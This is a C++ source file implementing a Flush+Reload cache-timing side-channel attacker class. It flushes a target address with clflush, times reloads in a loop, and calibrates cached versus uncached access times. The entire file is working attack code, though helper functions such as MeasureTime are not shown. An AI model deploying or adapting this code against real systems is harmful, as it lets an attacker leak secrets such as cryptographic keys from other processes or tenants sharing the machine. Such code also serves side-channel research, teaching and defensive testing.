#include "FRAttacker.h"
#include <unistd.h>
#include <time.h>
#include <stdexcept>
#include <iostream>

using namespace std;

FRAttacker::FRAttacker() :
    Attacker() {}

FRAttacker::FRAttacker(string path, char* target, int len) :
    Attacker(path, target, len) {}

FRAttacker::FRAttacker(string path, char* target, int len, int intervalTime) :
    Attacker(path, target, len, intervalTime) {}

FRAttacker::FRAttacker(string path, char* target, int len, int intervalTime, int iteration) :
    Attacker(path, target, len, intervalTime, iteration) {}

__attribute__((always_inline)) void FRAttacker::Flush(void* toFlush){
    __asm__ __volatile__ ("clflush (%0)" :: "r"(toFlush));
}

void FRAttacker::Attack() {
    // declaring variables
    unsigned int measured;

    // logic
    // create a new measurements class
    measurements = Measurements();
    measurements.SetInCacheTime(inCacheTime);
    measurements.SetNoCacheTime(noCacheTime);

    // check dependencies
    if (inCacheTime == 0 || noCacheTime == 0)
        throw logic_error("inCacheTime or noCacheTime not set. please set them manually or run Configure()");
    if (interval == 0)
        throw logic_error("interval not set. please set manually");
    if (targetPointer == nullptr)
        throw logic_error("target not set. please set manually");

    // flush for the first time
    if (maxIterations > 0)
        Flush(targetPointer);

    // main attacking loop: wait, measure, flush
    for (int i = 0; i < maxIterations; i++) {
        Flush(targetPointer);
        usleep(interval);
        measured = MeasureTime(targetPointer);
        //cout << "time - " << measured << endl;
        measurements.AddMeasurement(time(NULL), measured);
    }
    measurements.UpdateSpeculations();
}

void FRAttacker::Configure() {
    int i;
    unsigned int cyclesSum = 0;
    int numOfIterations = 1000;

    if (targetPointer == nullptr) {
        throw logic_error("target not defined");
    }

    //find noCacheTime
    for (i = 0; i < numOfIterations; i++) {
        Flush(targetPointer);
        cyclesSum += MeasureTime(targetPointer);
    }
    SetNoCacheTime(cyclesSum / numOfIterations);
    // find inCacheTime
    cyclesSum = 0;
    MeasureTime(targetPointer); /* makes sure target pointer has been recently read */
    for (i = 0; i < numOfIterations; i++){
        cyclesSum += MeasureTime(targetPointer);
    }
    SetInCacheTime(cyclesSum / numOfIterations);
}